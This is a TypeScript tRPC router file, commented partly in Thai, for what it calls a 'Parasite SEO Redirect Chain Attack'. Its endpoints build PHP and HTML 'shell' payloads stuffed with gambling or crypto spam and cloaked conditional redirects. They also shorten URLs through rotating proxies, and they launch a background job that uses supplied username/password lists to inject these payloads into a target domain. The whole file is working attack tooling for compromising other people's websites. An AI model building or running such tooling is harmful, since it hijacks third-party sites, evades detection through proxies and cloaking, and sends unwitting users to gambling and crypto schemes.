/**
 * Parasite Redirect Chain Router
 * 
 * tRPC endpoints สำหรับ Parasite SEO Redirect Chain Attack
 * ครอบคลุม: Short URL creation, Payload generation, Injection, Verification, Proxy management
 */

import { z } from "zod";
import { protectedProcedure, router } from "../_core/trpc";
import {
  createShortUrl,
  createBulkShortUrls,
  executeRedirectChainAttack,
  verifyRedirectChain,
  generateAiSeoContent,
  getProxyStats,
  testProxy,
  type RedirectChainConfig,
  type RedirectChainResult,
} from "../parasite-redirect-chain";
import { generateParasiteSeoPhp, generateParasiteSeoHtml, generateParasiteSeoBundle, getDefaultKeywords } from "../parasite-seo-injector";
import { proxyPool } from "../proxy-pool";

// In-memory job tracking
interface ChainJob {
  id: string;
  status: "running" | "done" | "failed";
  config: any;
  result: RedirectChainResult | null;
  progress: { phase: string; detail: string }[];
  startedAt: number;
  finishedAt?: number;
}

const activeJobs = new Map<string, ChainJob>();

export const parasiteRedirectChainRouter = router({

  // ─── Create Short URL ───
  createShortUrl: protectedProcedure
    .input(z.object({
      longUrl: z.string().url(),
      service: z.enum(["tly", "bitly", "isgd", "vgd", "clckru", "direct"]).default("isgd"),
      apiKey: z.string().optional(),
      useProxy: z.boolean().default(true),
    }))
    .mutation(async ({ input }) => {
      return createShortUrl(input.longUrl, input.service, input.apiKey, input.useProxy);
    }),

  // ─── Create Bulk Short URLs ───
  createBulkShortUrls: protectedProcedure
    .input(z.object({
      longUrls: z.array(z.string().url()).max(100),
      service: z.enum(["tly", "bitly", "isgd", "vgd", "clckru", "direct"]).default("isgd"),
      apiKey: z.string().optional(),
      useProxy: z.boolean().default(true),
    }))
    .mutation(async ({ input }) => {
      return createBulkShortUrls(input.longUrls, input.service, input.apiKey, input.useProxy);
    }),

  // ─── Generate Parasite SEO Payload ───
  generatePayload: protectedProcedure
    .input(z.object({
      redirectUrl: z.string(),
      keywords: z.array(z.string()).default([]),
      language: z.enum(["th", "en", "auto"]).default("th"),
      contentStyle: z.enum(["gambling", "crypto", "ecommerce", "generic"]).default("gambling"),
      contentLength: z.enum(["short", "medium", "long"]).default("long"),
      includeSchema: z.boolean().default(true),
      includeFaq: z.boolean().default(true),
      conditionalRedirect: z.boolean().default(true),
      domain: z.string().optional(),
    }))
    .mutation(async ({ input }) => {
      const keywords = input.keywords.length > 0 ? input.keywords : getDefaultKeywords(input.contentStyle);
      const payload = generateParasiteSeoPhp({
        redirectUrl: input.redirectUrl,
        keywords,
        language: input.language,
        contentStyle: input.contentStyle,
        contentLength: input.contentLength as "short" | "medium" | "long",
        includeSchema: input.includeSchema,
        includeFaq: input.includeFaq,
        includeComparisonTable: true,
        conditionalRedirect: input.conditionalRedirect,
        internalLinkDomain: input.domain,
      });
      return {
        filename: payload.shell.filename,
        content: payload.shell.content,
        wordCount: payload.wordCount,
        seoScore: payload.seoScore,
        description: payload.shell.description,
      };
    }),

  // ─── Generate HTML Payload (no PHP) ───
  generateHtmlPayload: protectedProcedure
    .input(z.object({
      redirectUrl: z.string(),
      keywords: z.array(z.string()).default([]),
      language: z.enum(["th", "en", "auto"]).default("th"),
      contentStyle: z.enum(["gambling", "crypto", "ecommerce", "generic"]).default("gambling"),
    }))
    .mutation(async ({ input }) => {
      const keywords = input.keywords.length > 0 ? input.keywords : getDefaultKeywords(input.contentStyle);
      const payload = generateParasiteSeoHtml({
        redirectUrl: input.redirectUrl,
        keywords,
        language: input.language,
        contentStyle: input.contentStyle,
        contentLength: "long",
        includeSchema: true,
        includeFaq: true,
        includeComparisonTable: true,
        conditionalRedirect: true,
      });
      return {
        filename: payload.shell.filename,
        content: payload.shell.content,
        wordCount: payload.wordCount,
        seoScore: payload.seoScore,
      };
    }),

  // ─── Generate AI SEO Content ───
  generateAiContent: protectedProcedure
    .input(z.object({
      keywords: z.array(z.string()).min(1),
      style: z.enum(["gambling", "crypto", "ecommerce", "generic"]).default("gambling"),
      wordCount: z.number().min(500).max(5000).default(1500),
    }))
    .mutation(async ({ input }) => {
      return generateAiSeoContent(input.keywords, input.style, input.wordCount);
    }),

  // ─── Execute Full Redirect Chain Attack ───
  executeChain: protectedProcedure
    .input(z.object({
      parasiteDomain: z.string().min(1),
      parasitePath: z.string().default("/"),
      finalDestUrl: z.string().min(1),
      referralCode: z.string().optional(),
      keywords: z.array(z.string()).default([]),
      shortenerService: z.enum(["tly", "bitly", "isgd", "vgd", "clckru", "direct"]).default("isgd"),
      shortenerApiKey: z.string().optional(),
      credentials: z.array(z.object({
        username: z.string(),
        password: z.string(),
      })).optional(),
      useProxy: z.boolean().default(true),
      enableCloaking: z.boolean().default(true),
      language: z.enum(["th", "en", "auto"]).default("th"),
      contentStyle: z.enum(["gambling", "crypto", "ecommerce", "generic"]).default("gambling"),
    }))
    .mutation(async ({ input }) => {
      const jobId = `chain-${Date.now()}-${Math.random().toString(36).substring(2, 8)}`;
      
      const job: ChainJob = {
        id: jobId,
        status: "running",
        config: input,
        result: null,
        progress: [],
        startedAt: Date.now(),
      };
      activeJobs.set(jobId, job);
      
      // Run in background
      (async () => {
        try {
          const result = await executeRedirectChainAttack({
            ...input,
            onProgress: (phase, detail) => {
              job.progress.push({ phase, detail });
            },
          });
          job.result = result;
          job.status = result.success ? "done" : "failed";
        } catch (err: any) {
          job.status = "failed";
          job.result = {
            success: false,
            chain: [],
            shortUrl: null,
            parasitePayload: null,
            injectionResult: null,
            verificationResult: null,
            proxyUsed: null,
            totalDurationMs: Date.now() - job.startedAt,
            error: err.message,
          };
        }
        job.finishedAt = Date.now();
      })();
      
      return { jobId, status: "running" };
    }),

  // ─── Get Chain Job Status ───
  getJobStatus: protectedProcedure
    .input(z.object({ jobId: z.string() }))
    .query(({ input }) => {
      const job = activeJobs.get(input.jobId);
      if (!job) return { found: false as const };
      return {
        found: true as const,
        id: job.id,
        status: job.status,
        progress: job.progress,
        result: job.result,
        startedAt: job.startedAt,
        finishedAt: job.finishedAt,
        durationMs: (job.finishedAt || Date.now()) - job.startedAt,
      };
    }),

  // ─── Verify Redirect Chain ───
  verifyChain: protectedProcedure
    .input(z.object({
      startUrl: z.string().url(),
      expectedFinalUrl: z.string(),
      useProxy: z.boolean().default(true),
    }))
    .mutation(async ({ input }) => {
      return verifyRedirectChain(input.startUrl, input.expectedFinalUrl, input.useProxy);
    }),

  // ─── Proxy Management ───
  getProxyStats: protectedProcedure
    .query(() => {
      return getProxyStats();
    }),

  getProxyList: protectedProcedure
    .query(() => {
      const proxies = proxyPool.getAllProxies();
      return proxies.map((p: any, i: number) => ({
        index: i,
        host: p.host,
        port: p.port,
        label: p.label || `${p.host}:${p.port}`,
        lastUsed: p.lastUsed || null,
        successRate: p.successRate ?? null,
        avgLatency: p.avgLatency ?? null,
      }));
    }),

  testProxy: protectedProcedure
    .input(z.object({ proxyIndex: z.number() }))
    .mutation(async ({ input }) => {
      return testProxy(input.proxyIndex);
    }),

  testAllProxies: protectedProcedure
    .mutation(async () => {
      const proxies = proxyPool.getAllProxies();
      const results: Array<{ index: number; host: string; ok: boolean; latencyMs: number; ip?: string }> = [];
      
      // Test in batches of 5
      for (let i = 0; i < proxies.length; i += 5) {
        const batch = proxies.slice(i, i + 5);
        const batchResults = await Promise.allSettled(
          batch.map(async (p: any, j: number) => {
            const result = await proxyPool.checkProxy(p);
            return { index: i + j, host: `${p.host}:${p.port}`, ...result };
          })
        );
        for (const r of batchResults) {
          if (r.status === "fulfilled") results.push(r.value);
          else results.push({ index: results.length, host: "unknown", ok: false, latencyMs: 0 });
        }
      }
      
      return {
        total: proxies.length,
        alive: results.filter(r => r.ok).length,
        dead: results.filter(r => !r.ok).length,
        avgLatency: Math.round(results.filter(r => r.ok).reduce((s, r) => s + r.latencyMs, 0) / Math.max(results.filter(r => r.ok).length, 1)),
        results,
      };
    }),

  // ─── Get Active Jobs ───
  getActiveJobs: protectedProcedure
    .query(() => {
      const jobs: any[] = [];
      for (const [id, job] of Array.from(activeJobs.entries())) {
        jobs.push({
          id,
          status: job.status,
          config: { parasiteDomain: job.config.parasiteDomain, finalDestUrl: job.config.finalDestUrl },
          progressCount: job.progress.length,
          lastProgress: job.progress[job.progress.length - 1] || null,
          startedAt: job.startedAt,
          finishedAt: job.finishedAt,
        });
      }
      return jobs.sort((a, b) => b.startedAt - a.startedAt);
    }),

  // ─── Get Default Keywords ───
  getDefaultKeywords: protectedProcedure
    .input(z.object({
      style: z.enum(["gambling", "crypto", "ecommerce", "generic"]).default("gambling"),
    }))
    .query(({ input }) => {
      return getDefaultKeywords(input.style);
    }),
});
